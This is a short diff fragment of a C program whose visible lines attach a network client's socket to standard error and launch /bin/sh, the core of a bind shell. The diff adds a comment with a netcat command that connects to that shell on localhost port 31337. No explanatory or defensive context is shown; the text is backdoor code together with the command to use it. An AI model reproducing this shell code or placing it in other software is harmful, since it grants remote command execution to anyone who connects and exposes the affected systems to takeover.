@@ -22,3 +22,4 @@ int main(void) {
  dup2(client_fd, 2);
  execve( "/bin/sh", NULL, NULL );
 }
+//nc -vvv localhost 31337
